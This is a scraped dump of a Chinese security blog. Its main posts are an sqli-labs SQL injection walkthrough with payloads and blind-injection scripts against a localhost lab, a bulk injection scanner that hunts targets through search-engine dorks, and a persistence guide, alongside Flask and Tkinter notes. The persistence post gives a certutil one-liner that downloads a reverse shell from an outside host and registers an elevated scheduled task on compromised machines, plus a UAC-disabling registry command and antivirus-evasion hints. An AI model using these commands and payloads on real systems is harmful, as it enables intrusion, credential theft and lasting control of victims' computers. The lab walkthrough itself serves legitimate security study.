http://127.0.0.1/sqli-labs/Less-3/?id=1%27)%20and%201=1%20+--+ 返回正常，后续也和上面2个题一样 Less-4（UNION 注入）判断注入类型这次我们判断用 id=1&quot; 得到报错信息 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1 说明也存在注入，这里的报错信息中，也有一个)，而且和上一题相比，这个题用到的也是&quot; 所以用&quot;)去闭合，构造 http://127.0.0.1/sqli-labs/Less-4/?id=1%22)%20and%201=1%20+--+ 返回正常 后续步骤和之前几个题一样，就不多写了 Less-5（报错注入或盲注）判断注入类型末尾加上 &#39; 报错 加上 &#39; +--+ 返回正常，说明需要&#39;来闭合 这里可以直接用 updatexml 报错注入 http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)+--+ 但是毕竟这题要用盲注，那就还是用盲注吧 这题虽然能用 order by得到列数，但是用UNION 联合查询时，无论怎样都不能得到显位 所以我们要采用盲注的方法 判断数据库长度length(database()) &gt; 8 http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20length(database())%20%3E%208+--+ 没有回显 length(database()) &gt; 7 http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20length(database())%20%3E%207+--+ 正常回显 说明数据库长度为 8 判断数据库名称之前已经得到数据库的长度为 8 了 判断第一位 &gt;114 返回正常1http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20ascii(substr((select%20database()),1,1))%20%3E%20114+--+ &gt;115 返回不正常 http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20ascii(substr((select%20database()),1,1))%20%3E%20115+--+ 说明数据库的第一位是 s(ascii码为 115) 因为每一次都这样验证很浪费时间，所以我们写脚本慢慢跑 123456789101112#!/usr/bin/pythonimport requestsdatabase = &apos;&apos;url = &apos;http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and ascii(substr((select database()),&#123;times&#125;,1)) &gt; &#123;num&#125;+--+&apos;for times in range(1,9): for num in range(ord(&apos;a&apos;),ord(&apos;z&apos;)+1): content = requests.get(url.format(times=times,num=num)).text if &apos;You&apos; not in content: database += chr(num) print (database) breakprint (database) 123456789ssesecsecusecursecurisecuritsecuritysecurity 得到数据库名称为 security 判断表名长度这里我打算先把查询出来的所有表名用逗号连接在一起，然后再算出总长度 &gt;28 返回正常 http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20(select%20length(group_concat(table_name))%20from%20information_schema.tables%20where%20table_schema=%27security%27)%3E28%20+--+ &gt;29 返回不正常 http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20(select%20length(group_concat(table_name))%20from%20information_schema.tables%20where%20table_schema=%27security%27)%3E29+--+ 说明用逗号连接的所有表的长度为 29 判断所有表名&gt; 100 返回正常 http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27),1,1))%3E100+--+ &gt; 101 返回不正常 http://127.0.0.1/sqli-labs/Less-5/?id=1&#39; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),1,1))&gt;101+--+ 所有第一位是 e 同样太麻烦，写脚本慢慢跑 12345678910111213import requestsdatabase = &apos;&apos;url = &apos;http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27),&#123;times&#125;,1))%3E&#123;num&#125;+--+&apos;nums = [n for n in range(ord(&apos;a&apos;),ord(&apos;z&apos;)+1)]nums.insert(0,ord(&apos;,&apos;))for times in range(1,30): for num in nums: content = requests.get(url.format(times=times,num=num)).text if &apos;You&apos; not in content: database += chr(num) print (database) breakprint (database) 结果 123456789101112131415161718192021222324252627282930eememaemaiemailemailsemails,emails,remails,reemails,refemails,refeemails,referemails,refereemails,refereremails,referersemails,referers,emails,referers,uemails,referers,uaemails,referers,uagemails,referers,uageemails,referers,uagenemails,referers,uagentemails,referers,uagentsemails,referers,uagents,emails,referers,uagents,uemails,referers,uagents,usemails,referers,uagents,useemails,referers,uagents,useremails,referers,uagents,usersemails,referers,uagents,users 判断列内容长度&gt; 19 返回正常 http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20(select%20length(group_concat(column_name))%20from%20information_schema.columns%20where%20table_name=%27users%27)%20%3E%2019+--+ &gt; 20 返回不正常 http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20(select%20length(group_concat(column_name))%20from%20information_schema.columns%20where%20table_name=%27users%27)%20%3E%2020+--+ 所以列的内容长度为 20 判断列的内容刚才我们已经拿到表名，我们看中的是 users 这个表 所以我们仅对 users 进行猜解，现在依然用跑脚本的方法，拿到列名 脚本12345678910111213import requestsdatabase = &apos;&apos;url = &apos;http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20ascii(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),&#123;times&#125;,1))%3E&#123;num&#125;+--+&apos;nums = [n for n in range(ord(&apos;a&apos;),ord(&apos;z&apos;)+1)]nums.insert(0,ord(&apos;,&apos;))for times in range(1,21): for num in nums: content = requests.get(url.format(times=times,num=num)).text if &apos;You&apos; not in content: database += chr(num) print (database) breakprint (database) 结果id,username,passwor 判断字段内容给的长度&gt; 174 返回正常http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20(select%20length(group_concat(username,password))%20from%20users)%20%3E%20174+--+ &gt; 174 返回不正常http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20(select%20length(group_concat(username,password))%20from%20users)%20%3E%20175+--+ 所以返回字段的内容长为 175 判断字段内容脚本类似 最后的结果为 DumbDumb,AngelinaI-kill-you,Dummyp@ssword,securecrappy,stupidstupidity,supermangenious,batmanmob!le,adminadmin,admin1admin1,admin2admin2,admin3admin3,dhakkandumbo,admin4admin4 这样确实不太好看出来，所以可以采用 select group_concat(concat_ws(&#39;:&#39;,username,password)) from users 结果为 Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4 Less-6（报错注入或盲注）这里和上一个题几乎一样，只不过这里闭合用到的是 &quot; 而已 http://127.0.0.1/sqli-labs/Less-6/?id=1%22%20+--+ 后面就不在多写了，一个模子刻出来的 只需要把最后的 &#39; 换成 &quot; 就可以了 Less-7（outfile）进入题目，参数改成 id=1 得到回显 You are in.... Use outfile...... http://127.0.0.1/sqli-labs/Less-7/?id=1%27))%20and%20ascii(left(database(),1))%20%3E%2097+--+ 这个题用上面的盲注也可以做出来，但这里要求用outfile，那就用吧 这里主要也是用到前面的 union 注入 当然实战中有写的权限基本都是直接写shell进去了 这里就随便演示一下吧 根据 order by 可知，有3列 查数据库 http://127.0.0.1/sqli-labs/Less-7/?id=1%27))%20union%20select%201,(select%20database()),3%20into%20outfile%20%27D:\\\\phpStudy\\\\WWW\\\\sqli-labs\\\\123.txt%27+--+ 结果 121 Dumb Dumb1 security 3 查表名 http://127.0.0.1/sqli-labs/Less-7/?id=1%27))%20union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27),3%20into%20outfile%20%27D:\\\\phpStudy\\\\WWW\\\\sqli-labs\\\\123.txt%27+--+ 结果 后续操作就不再详细说了 Less-8（盲注）和 Less-5 几乎是一模一样的，唯一的区别就是这里只能用盲注，而Less-5可以用报错注入 Less-9 (基于时间的盲注)这个题无论怎么构造payload 永远都是 You are in........... 根据题目中的提示，我们可以知道这个是基于时间的盲注 和之前的盲注差不多，只不过要增加一个 if 语句 一样的写脚本跑，这里就只写跑数据库名字的吧，毕竟太浪费时间了 脚本内容 123456789101112131415import requestsimport timeurl = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if(ascii(substr((select database()),&#123;num&#125;,1))&gt;&#123;asc&#125;,0,sleep(3)) +--+&quot;db_name = &apos;&apos;for num in range(1,9): for asc in range(ord(&apos;a&apos;),ord(&apos;z&apos;)+1): s_time = time.time() requests.get(url.format(num=num,asc=asc)) e_time = time.time() if (e_time-s_time) &gt; 3: db_name += chr(asc) print (db_name) break 结果 12345678ssesecsecusecursecurisecuritsecurity Less-10 (基于时间的盲注)和 Less-9 差不多，只不过这里闭合用的是 &quot; ， 而 Less-9用的是 &#39; Less-11（UNION注入和POST注入） 这种登陆框的，一般都是 post注入，因为提交数据是post方式提交的，然后再进入数据库查询，所以过滤不严也会有注入的情况发生 所以我们登陆的时候利用bp抓包 然后 send to reapter 和以前一样，最先尝试 union 注入 先判断列数 order by 3 报错 order by 2 返回正常 说明有两列 后面就再演示一下查数据库名吧 成功查出数据库名为 security 后面步骤和前面类似就不再赘述了 Less-12（UNION注入和POST注入） 和上一个题一样，只不过这里闭合用到的是 &quot;) Less-13（POST注入、盲注、报错注入） 如果在参数末尾直接输入&#39;，会报错，而报错信息中表名，闭合应该用 &#39;) 所以我们继续尝试，但这个题，无论怎么输入，都没有显位，只有报错信息，所以可以考虑用盲注或者报错注入 虽然题目中所用的是盲注，但是能利用报错注入我们就避免使用盲注，因为盲注确实很浪费时间 得到数据库名 后面方法与之前类似 Less-14（POST注入、盲注、报错注入）和上个题类型一样，，只不过这里闭合用到的是&quot; Less-15（POST注入和基于时间的盲注）这个题，无论如何都不会有任何报错信息，也没有返回信息，所以这里我们就只能用到基于时间的盲注 图中会延时10秒 Less-16（POST注入和基于时间的盲注）和上一个题一样，只不过这里闭合所用到的是 &quot;) Less-17（POST注入、盲注、报错注入）和之前一样，先闭合前面一句的输入 这里没有在用户名处注入，是因为用户名输入的内容会经过一个check_input函数过滤 1234567891011121314151617181920212223242526function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; 所以我们选择了 passwd 这个参数来进行注入 这里 order by 用不了，无法得到列数，所以这里不能采用 UNION 注入 于是乎采用报错注入或者盲注 因为自己比较懒，所以这里还是用报错注入来吧 成功得到数据库名称 Less-18 （UA 注入）1$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;; 根据源码，这里会将 uagents 写入数据库，也就是我们的User-Agent 这里仍然抓包 我们先用&#39;闭合 uagent前面的&#39;，然后插入我们报错注入的语句，因为这个语句不能直接给后面注释掉，要让后面的正常运行，所以我们还要闭合uagents后面的&#39;，所以，就构成了我们的 payload &#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;1&#39; = &#39;1 后续其他数据类似 Less-19 （Referer 注入）和上一个题类似，只不过这里注入是 referer 的注入，只需要将 referer 的内容改成我们上一题的 payload 即可 Less-20 （cookie 注入）和以前一样，登陆过程中抓包 发现登陆成功后有一个cookie的值 再次刷新页面，拿到cookie，在通过构造cookie成功注入 这里仍然用的是报错注入","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://damit5.com/tags/渗透测试/"},{"name":"SQLI","slug":"SQLI","permalink":"https://damit5.com/tags/SQLI/"}]},{"title":"Python_Flask_学习笔记","slug":"Python-Flask-学习笔记","date":"2018-05-07T08:52:33.000Z","updated":"2018-06-10T03:51:49.366Z","comments":true,"path":"2018/05/07/Python-Flask-学习笔记/","link":"","permalink":"https://damit5.com/2018/05/07/Python-Flask-学习笔记/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer14\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 官方完整文档快速入门","text":"new APlayer({ element: document.getElementById(\"aplayer14\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 官方完整文档快速入门 学习小结 最小应用123456789from flask import Flaskapp = Flask(__name__)@app.route(&apos;/&apos;)def hello_world(): return &apos;Hello World!&apos;if __name__ == &apos;__main__&apos;: app.run() run() 参数1app.run(host=&apos;0.0.0.0&apos;,port=80,debug=True) host : 0.0.0.0 监听所有公开IP port : 监听的端口，默认为5000 debug : debug 模式，修改代码后会自动重启，上线服务不推荐这样做 路由简单的来说就是访问你服务器的地址 比如 /admin /login /phpMyadmin / 的问题访问的时候只能少，不能多 1234567@app.route(&apos;/projects/&apos;)def projects(): return &apos;The project page&apos;@app.route(&apos;/about&apos;)def about(): return &apos;The about page&apos; 可以访问 /projects 但是不能访问 /about/，会抛出404异常 URL 的构造 使用 flask 自带的 url_for 使用前需要先从flask模块导入(from flask import url_for) 小例子123456789101112131415161718192021from flask import Flask,url_forapp = Flask(__name__)@app.route(&apos;/&apos;)def hello_world(): return &apos;Hello World!&apos;@app.route(&apos;/welcome/&lt;name&gt;&apos;)def welcome(): return str(url_for(&apos;hello_world&apos;))@app.route(&apos;/about&apos;)def about(): return &apos;The about page&apos;@app.route(&apos;/test&apos;)def test(): print (url_for(&apos;hello_world&apos;)) print (url_for(&apos;about&apos;,abc=&apos;123&apos;)) print (url_for(&apos;welcome&apos;,name=&apos;123&apos;)) return &apos;test&apos;if __name__ == &apos;__main__&apos;: app.run(host=&apos;127.0.0.1&apos;,port=80,debug=True) 123//about?abc=123/welcome/123 注意 url_for 的参数是已经创建的方法名 url_for 中的方法名需要用引号引起来 HTTP 方法默认只允许 GET 请求 如果要允许其他请求方法，那么则需要通过装饰器提供的 methods 参数来改变 一个小例子123456789from flask import Flask,url_for,requestapp = Flask(__name__)@app.route(&apos;/&apos;,methods=[&apos;POST&apos;,&apos;GET&apos;])def index(): return request.methodif __name__ == &apos;__main__&apos;: app.run(host=&apos;127.0.0.1&apos;,port=80,debug=True) 常见 HTTP 方法 GET HEAD POST PUT DELETE OPTIONS 渲染模板说简单点就是一个 html 的页面 还是需要先引入render_template 这个模块 from flask import render_template 然后在当前目录创建 templates 文件夹，并将 html 文件放入改文件夹中 参考 静态文件处理CSS 和 JavaScipt 文件的自动处理 1.创建 static 文件夹 2.将静态文件放进 static 3.修改html中的css js 的路径为 /static/xxx.js 接收请求数据引入from flask impoort request 小例子1234567891011from flask import Flask,requestapp = Flask(__name__)@app.route(&apos;/&apos;,methods=[&apos;POST&apos;,&apos;GET&apos;])def index(): return str(request.form) #return str(request.headers)if __name__ == &apos;__main__&apos;: app.run(host=&apos;127.0.0.1&apos;,port=80,debug=True) form 和 args 返回值是字典格式的 request请求对象 总结123456path # 请求的 urlmethod # 请求方法form # post过来的数据args # get 过来的数据json # post 过来的json数据header # 查看请求头 文件上传确保在你的 HTML 表单中不要忘记设置属性 enctype=&quot;multipart/form-data&quot;， 否则浏览器将不传送文件。 1234567from flask import request@app.route(&apos;/upload&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def upload_file(): if request.method == &apos;POST&apos;: f = request.files[&apos;the_file&apos;] f.save(&apos;/var/www/uploads/uploaded_file.txt&apos;) 重定向你能够用 redirect() 函数重定向用户到其它地方。能够用 abort() 函数提前中断一个请求并带有一个错误代码 redirect 重定向到一个url上 abort 自定义出错状态码，并且直接中断，不运行后面的 1234567891011121314from flask import Flask,url_for,redirect,abortapp = Flask(__name__)@app.route(&apos;/&apos;,methods=[&apos;POST&apos;,&apos;GET&apos;])def hello_world(): abort(404) return redirect(url_for(&apos;test&apos;))@app.route(&apos;/test&apos;)def test(): return &apos;hello&apos;if __name__ == &apos;__main__&apos;: app.run(host=&apos;127.0.0.1&apos;,port=80,debug=True) 错误页面使用 errorhandler() 装饰器 创建的方法中应该含有一个 error 参数，用于确认到底是哪种出错 return 后面的数字就表示返回的状态码，如果是405就改成405 1234567891011121314from flask import Flask,url_for,redirect,abortapp = Flask(__name__)@app.route(&apos;/&apos;,methods=[&apos;POST&apos;,&apos;GET&apos;])def hello_world(): abort(404)@app.errorhandler(404)def page_404(error): return (error) #return &apos;&lt;h1&gt;404 NOT FOUND&lt;/h1&gt;&apos;,404if __name__ == &apos;__main__&apos;: app.run(host=&apos;127.0.0.1&apos;,port=80,debug=True) END","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://damit5.com/tags/Python/"}]},{"title":"Sqli_Scan","slug":"Sqli-Scan","date":"2018-03-23T08:32:12.000Z","updated":"2018-06-10T03:59:10.021Z","comments":true,"path":"2018/03/23/Sqli-Scan/","link":"","permalink":"https://damit5.com/2018/03/23/Sqli-Scan/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer7\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); SQLI SCANSqli_Scan , 批量sql注入扫描器 首先从浏览器（Bing、Google、Yahoo）上根据关键词搜索符合条件的链接，再根据链接进行自动判断是否可能存在注入","text":"new APlayer({ element: document.getElementById(\"aplayer7\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); SQLI SCANSqli_Scan , 批量sql注入扫描器 首先从浏览器（Bing、Google、Yahoo）上根据关键词搜索符合条件的链接，再根据链接进行自动判断是否可能存在注入 依赖 python3 下载12345git clone https://github.com/damit5/sqli_scan.gitcd sqli_scanpip install -r requirements.txt 基本使用12345678910111213141516171819 =============================================================================== _________________ .____ .___ _________ / _____/\\_____ \\ | | | | / _____/ ____ _____ ____ \\_____ \\ / / \\ \\| | | | \\_____ \\_/ ___\\\\__ \\ / \\ / \\/ \\_/. \\ |___| | / \\ \\___ / __ \\| | \\ /_______ /\\_____\\ \\_/_______ \\___| /_______ /\\___ &gt;____ /___| / \\/ \\__&gt; \\/ \\/ \\/ \\/ \\/ d4m1ts ===============================================================================usage: sqli_scan.py [-h] [-k inurl:example] [-p 5] [-e search engine]optional arguments: -h, --help show this help message and exit -k inurl:example sql injection keyword -p 5 page of websites to look for in search engine -e search engine the search engine you want to use. bing,yahoo,google 执行 python sqli_scan.py -k inurl:php?id= -p 3 -e bing 演示视频 项目地址","categories":[],"tags":[{"name":"SQLI","slug":"SQLI","permalink":"https://damit5.com/tags/SQLI/"}]},{"title":"权限维持之开机获取管理员权限","slug":"权限维持之开机获取管理员权限","date":"2018-01-06T13:37:32.000Z","updated":"2018-06-10T04:00:27.071Z","comments":true,"path":"2018/01/06/权限维持之开机获取管理员权限/","link":"","permalink":"https://damit5.com/2018/01/06/权限维持之开机获取管理员权限/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer17\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0x00 前言看了看上一篇博客的时间已经是去年了，所以今天还是来水一篇吧，证明我还活着","text":"new APlayer({ element: document.getElementById(\"aplayer17\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0x00 前言看了看上一篇博客的时间已经是去年了，所以今天还是来水一篇吧，证明我还活着很早之前就想写这玩意儿了，只不过一直因为时间问题一直拖到了现在，经过2天的各种查资料终于写出了一个最简单的 这里必须要吐槽一下360，流氓软件出身的果然不一样，修改注册表拦截，移动文件到启动目录拦截，system32文件夹下载文件拦截，你就说你有什么不拦截吧！！！ 0x01 思路先获取肉鸡的管理员权限，然后通过一系列手段达到肉鸡重启后能再次反弹一个管理员权限shell的目的（如果肉鸡装了360。。。直接跳过吧，不知道怎么绕过拦截添加计划任务） 思路： msf 上线 添加计划任务 细分一下： msf上线 进入c:/windows文件夹 自动下载可执行文件（就是你的反弹shell） 添加计划任务 0x02 具体操作拿到管理员权限过后也就执行一句话 cd C:/Windows&amp;&amp;certutil -urlcache -split -f https://xxx/svchost.exe&amp;&amp;attrib +s +h svchost.exe&amp;&amp;schtasks.exe /Create /TN update /TR C:\\Windows\\svchost.vbs /SC ONLOGON /F /RL HIGHEST 每个命令大概解释 进入 C:/Windnws 文件夹 下载我的反弹shell（这个是弹到msf上的） 隐藏我的shell文件 新建一个计划任务，在用户登陆后开始执行 0x03 解决问题你的reverse_shell需要解决的问题 免杀 （自己想办法解决吧） 能自行判断肉鸡是否联网（因为开机直接运行，没联网的话也就凉凉了） 演示视频：https://youtu.be/IYKFERG_53Y 0x04 也有简单粗暴的办法 关闭UAC 1reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System&quot; /v EnableLUA /t REG_DWORD /d 0 /f 将自己的shell可执行文件名字修改为 setup或者install或者uninstall等本来会触发UAC的关键字 加入开机项 修改注册表 直接加入开机目录","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://damit5.com/tags/渗透测试/"}]},{"title":"Tkinter 学习笔记","slug":"Tkinter-学习笔记","date":"2017-12-11T05:58:35.000Z","updated":"2018-06-10T03:59:26.637Z","comments":true,"path":"2017/12/11/Tkinter-学习笔记/","link":"","permalink":"https://damit5.com/2017/12/11/Tkinter-学习笔记/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer9\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 简介 Tkinter 模块(Tk 接口)是 Python 的标准 Tk GUI 工具包的接口 .Tk 和 Tkinter 可以在大多数的 Unix 平台下使用,同样可以应用在 Windows 和 Macintosh 系统里。Tk8.0 的后续版本可以实现本地窗口风格,并良好地运行在绝大多数平台中。","text":"new APlayer({ element: document.getElementById(\"aplayer9\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 简介 Tkinter 模块(Tk 接口)是 Python 的标准 Tk GUI 工具包的接口 .Tk 和 Tkinter 可以在大多数的 Unix 平台下使用,同样可以应用在 Windows 和 Macintosh 系统里。Tk8.0 的后续版本可以实现本地窗口风格,并良好地运行在绝大多数平台中。 注意：所有的组件都需要加入布局（例如pack()），这样才会显示出来 话需要在括号里面指明是哪一个面板，例如 button = Tkinter.Button(window) 相当于java的加入面板add吧 mainloop() 相当于 java的 setvisible=True 1.继承Frame类别12345678910111213141516171819202122232425262728293031323334353637# -*- coding:utf-8 -*-import Tkinter# 继承 Frame 类class Application(Tkinter.Frame): # 初始化函数 def __init__(self,master=None): Tkinter.Frame.__init__(self,master) self.pack() self.add() # 添加组件函数 def add(self): self.But = Tkinter.Button(self,text=&apos;QUIT&apos;,command=self.quit,fg=&apos;RED&apos;) self.But.pack() self.Butt = Tkinter.Button(self,text=&apos;PRINT&apos;,command=self.out,fg=&apos;blue&apos;) self.Butt.pack() self.text = Tkinter.Entry(self) self.text.pack() # 调用输出的函数 def out(self): # 从 Entry 中获取内容 self.content = self.text.get() print self.contentif __name__ == &apos;__main__&apos;: app = Application() # 设置窗口标题 app.master.title(&apos;hello&apos;) # 主消息循环 app.mainloop() 2.不用类，直接 Tk()1234# 关键语句from Tkinter import *app = Tk(className=&apos;test&apos;)app.mainloop() 12345678910111213141516171819202122232425262728293031323334353637# -*- coding:utf-8 -*-from Tkinter import *import tkMessageBoximport sys# 弹窗退出def out(): tkMessageBox.showinfo(title=&apos;MESSAGE&apos;, message=&apos;ERROR&apos;) sys.exit(0)# 命令行问好def say_hello(): tkMessageBox.showinfo(title=&apos;HELLO&apos;, message=&apos;Love you so much !&apos;)def frame(): app = Tk(className=&apos;test&apos;) # 括号里面加上 窗口的名字 进行区分，不然同时多个的话分不清楚 # 创建列表组件 language = [&apos;C&apos;,&apos;C++&apos;,&apos;Python&apos;,&apos;Java&apos;,&apos;Lua&apos;,&apos;php&apos;] listb = Listbox(app) for i in language: listb.insert(0,i) listb.pack() # 创建按钮组件,button1弹窗后退出,button2只是弹窗 button1 = Button(app,text=&apos;QUIT&apos;,command=out,fg=&apos;RED&apos;) button1.pack(side=&apos;left&apos;,expand=1) button2 = Button(text=&apos;HELLO&apos;,command=say_hello,fg=&apos;GREEN&apos;) button2.pack(side=&apos;right&apos;) app.mainloop()if __name__ == &apos;__main__&apos;: frame() 窗口主体框架1234567# -*- coding:utf-8 -*-import Tkinterwindow = Tkinter.Tk(screenName=None, baseName=None, className=&apos;Hello&apos;, useTk=1, sync=0, use=None)window.geometry(&apos;900x600&apos;) # 设置面板的大小 /dʒiˈɒmətri/window[&apos;bg&apos;] = &apos;black&apos; # 设置背景色window.mainloop() # 显示出来 组件介绍基本上通用的属性1234bg = &apos;black&apos;, # 背景色# bg = &apos;#000000&apos; # 也可以使用颜色代码fg = &apos;green&apos;, # 前景色font = (&apos;Arial&apos;,15),# 字体和大小 Label 标签12345678910label = Tkinter.Label(window, # 添加组件的面板text = &apos;OMG&apos;, # 显示的文字bg = &apos;green&apos;, # 背景颜色fg = &apos;red&apos;, # 前景色font = (&apos;Arial&apos;,20),# 字体和大小width = 15, # 宽height = 2 # 高)label.pack(side=&apos;bottom&apos;,expand=1) # pack固定组件模式的一种，side表示固定的位置（默认top） Button 按钮12345678910111213141516button = Tkinter.Button(window, # 添加组件的面板text = &apos;hit me&apos;, # 显示内容bg = &apos;black&apos;, # 背景色fg = &apos;green&apos;, # 前景色width = 15, # 宽height = 2, # 高font = (&apos;Arial&apos;,15),# 字体和大小command = quit # 执行的函数，quit表示退出)button.pack(side=&apos;right&apos;)# button[&apos;text&apos;] = &apos;233&apos;# 改变按钮的text Entry 简单文本1234567891011121314151617181920212223# 上面组件的条件大多数适用# 输入内容，均以 * 显示e = Tkinter.Entry(window,show=&apos;*&apos;)e.pack()# 输出，显示出输入的内容e1 = Tkinter.Entry(window)e1.pack()# 按钮响应的事件def dump(): e1.delete(&apos;0&apos;,&apos;end&apos;) # 删除e1框的所有内容 e1.insert(&apos;insert&apos;,e.get()) # 将e中的内容添加到e1中b = Tkinter.Button(window,text=&apos;dump&apos;,command=dump)b.pack()# e.get 获取框中的内容# 框中默认显示的内容# a = Tkinter.StringVar()# a.set(&apos;123&apos;)# Tkinter.Entry(window,textvariable=a).pack() Text 文本区域12345678910# 输入内容e = Tkinter.Text(window,bg=&apos;black&apos;,fg=&apos;green&apos;,height=2,font=15)e.pack()def get_text(): print e.get(&apos;0.0&apos;,&apos;end&apos;) # 打印出文本里面的所有内容 e.delete(&apos;0.0&apos;,&apos;end&apos;) # 删除文本框的内容b = Tkinter.Button(window,text=&apos;hit me&apos;,bg=&apos;black&apos;,fg=&apos;green&apos;,command=get_text)b.pack() Listbox 列表部件123456789101112list1 = [1,2,3,4,5,6,7,8,9,0]# 创建列表部件l = Tkinter.Listbox(window)for i in list1: l.insert(&apos;0&apos;,i)l.pack()def get_num(): print l.curselection() #查看当前选择项b = Tkinter.Button(window,text=&apos;hit it&apos;,bg=&apos;black&apos;,fg=&apos;green&apos;,font=&apos;20&apos;,command=get_num)b.pack() Radiobutton 选择按钮1234567891011121314l = Tkinter.Label(window,text=&apos;empty&apos;,bg=&apos;black&apos;,fg=&apos;green&apos;)l.pack()def sel(): l[&apos;text&apos;] = &apos;You have select &apos; + var.get()var = Tkinter.StringVar()# variable=var, value=&apos;A&apos;的意思就是，当我们鼠标选中了其中一个选项，把value的值A放到变量var中，然后赋值给variabler1 = Tkinter.Radiobutton(window,text=&apos;Option A&apos;,variable=var,value=&apos;A&apos;,command=sel)r2 = Tkinter.Radiobutton(window,text=&apos;Option B&apos;,variable=var,value=&apos;B&apos;,command=sel)r3 = Tkinter.Radiobutton(window,text=&apos;Option C&apos;,variable=var,value=&apos;C&apos;,command=sel)r1.pack()r2.pack()r3.pack() Scale 尺度（滚动条）12345678910111213141516def select(v): # 这里的参数 v 即滚动条定位的数据，自动传入 print vscale = Tkinter.Scale(window,label = &apos;try_me&apos;, # scale 部件的名称from_ = 5, # 从 5 开始to = 11, # 到 11 结束orient = Tkinter.HORIZONTAL, # 设置滚动条的方向为横向length = 300, # 滚动部件的长度，单位是像素showvalue = 0, # 0 表示当前数值不在滚动条上方显示，1表示当前数值在滚动条上方显示tickinterval = 2, # 2个坐标点之间的间隔resolution = 0.01, # 保留 2 位小数command = select # 执行的函数)scale.pack() Checkbutton 勾选项12345678910111213141516171819202122var1 = Tkinter.StringVar()var2 = Tkinter.StringVar()def select(): if var1.get() == &apos;1&apos; and var2.get() == &apos;1&apos;: print &apos;GOOD&apos; else: print &apos;ERROR&apos;checkbutton1 = Tkinter.Checkbutton(window,text = &apos;Python&apos;, # 显示内容variable = 